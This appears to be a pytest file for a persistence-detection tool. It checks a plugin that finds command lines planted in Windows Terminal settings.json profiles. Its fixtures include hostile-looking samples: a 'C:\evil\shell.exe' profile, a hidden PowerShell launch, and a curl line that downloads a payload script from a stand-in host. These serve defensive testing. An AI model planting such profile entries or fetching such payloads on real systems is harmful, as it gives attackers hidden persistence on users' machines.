"""Tests for the Windows Terminal settings.json profile plugin (T1546)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from pyrsistencesniper.core.models import AccessLevel
from pyrsistencesniper.core.registry import artifact_failures
from pyrsistencesniper.core.windows import _io_path
from pyrsistencesniper.plugins.T1546.windows_terminal import (
    WindowsTerminal,
    strip_jsonc,
)

from ..conftest import remove_over_length_tree
from .conftest import make_plugin, make_user_profiles, setup_filesystem

_PACKAGED = (
    r"AppData\Local\Packages"
    r"\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
)
_PREVIEW = (
    r"AppData\Local\Packages"
    r"\Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe\LocalState\settings.json"
)
_UNPACKAGED = r"AppData\Local\Microsoft\Windows Terminal\settings.json"

_GENERATED_HEADER = (
    "// This file was initially generated by Windows Terminal 1.22.12111.0\n"
    "// It should still be usable in newer versions, but newer versions might have\n"
    "// additional settings, help text, or changes that you will not see unless you\n"
    "// clear this file and let us generate a new one for you.\n"
)


def _terminal_plugin(tmp_path: Path, *usernames: str) -> object:
    """Build the plugin over the given user profiles, defaulting to one user."""
    return make_plugin(
        WindowsTerminal,
        tmp_path,
        user_profiles=make_user_profiles(*(usernames or ("user1",))),
    )


def _write_settings(plugin: object, username: str, location: str, text: str) -> None:
    """Drop one settings.json under a user's profile at a literal location."""
    setup_filesystem(plugin, {f"Users\\{username}\\{location}": text})


def test_object_form_suspicious_commandline(tmp_path: Path) -> None:
    """A profile command line is user-controlled and runs on terminal launch."""
    plugin = _terminal_plugin(tmp_path)
    data = {"profiles": {"list": [{"commandline": "C:\\evil\\shell.exe"}]}}
    _write_settings(plugin, "user1", _PACKAGED, json.dumps(data))
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == "C:\\evil\\shell.exe"
    assert findings[0].access_gained == AccessLevel.USER
    assert findings[0].path == f"Users\\user1\\{_PACKAGED}"


def test_default_commandline_still_emits_finding(tmp_path: Path) -> None:
    """Plugin emits every profile entry; classification is what filters defaults."""
    plugin = _terminal_plugin(tmp_path)
    data = {"profiles": {"list": [{"commandline": "cmd.exe"}]}}
    _write_settings(plugin, "user1", _PACKAGED, json.dumps(data))
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == "cmd.exe"


def test_profile_no_commandline(tmp_path: Path) -> None:
    """A profile with no commandline inherits the shell and is not persistence."""
    plugin = _terminal_plugin(tmp_path)
    data = {"profiles": {"list": [{"name": "Default"}]}}
    _write_settings(plugin, "user1", _PACKAGED, json.dumps(data))
    assert plugin.run() == []


def test_generated_comment_header_and_trailing_comma_are_parsed(tmp_path: Path) -> None:
    """Terminal ships JSONC; a commented file with a trailing comma must still parse."""
    plugin = _terminal_plugin(tmp_path)
    text = (
        _GENERATED_HEADER + '{\n    "profiles": {\n        "list": [\n'
        '            { "commandline": "C:\\\\evil\\\\shell.exe" },\n'
        "        ]\n    },\n}\n"
    )
    with pytest.raises(json.JSONDecodeError):
        json.loads(text)
    _write_settings(plugin, "user1", _PACKAGED, text)
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == "C:\\evil\\shell.exe"


def test_block_comment_is_stripped(tmp_path: Path) -> None:
    """Terminal also accepts block comments, which plain json.loads rejects."""
    plugin = _terminal_plugin(tmp_path)
    text = (
        "{\n    /* disabled while testing */\n"
        '    "profiles": { "list": ['
        ' { "commandline": "C:\\\\evil\\\\shell.exe" } ] }\n}'
    )
    _write_settings(plugin, "user1", _PACKAGED, text)
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == "C:\\evil\\shell.exe"


def test_comment_marker_inside_a_string_literal_survives(tmp_path: Path) -> None:
    """A // inside a URL is data, not a comment, and must survive the strip."""
    plugin = _terminal_plugin(tmp_path)
    commandline = "curl.exe https://example.test//stage/payload.ps1 -o C:\\a.ps1"
    text = _GENERATED_HEADER + json.dumps(
        {
            "$help": "https://aka.ms/terminal-documentation",
            "profiles": {"list": [{"commandline": commandline}]},
        }
    )
    _write_settings(plugin, "user1", _PACKAGED, text)
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == commandline


def test_escaped_quote_before_comment_marker_survives() -> None:
    """An escaped quote must not end the string and expose a // inside it."""
    commandline = 'cmd.exe /c echo \\" // not a comment'
    text = f'{{"profiles": {{"list": [{{"commandline": "{commandline}"}}]}}}}'
    assert json.loads(strip_jsonc(text)) == json.loads(text)


def test_array_form_profiles_is_parsed(tmp_path: Path) -> None:
    """The schema allows a bare profiles array; the old code raised AttributeError."""
    plugin = _terminal_plugin(tmp_path)
    data = {"profiles": [{"name": "PowerShell", "commandline": "powershell -w hidden"}]}
    _write_settings(plugin, "user1", _PACKAGED, json.dumps(data))
    findings = plugin.run()
    assert len(findings) == 1
    assert findings[0].value == "powershell -w hidden"


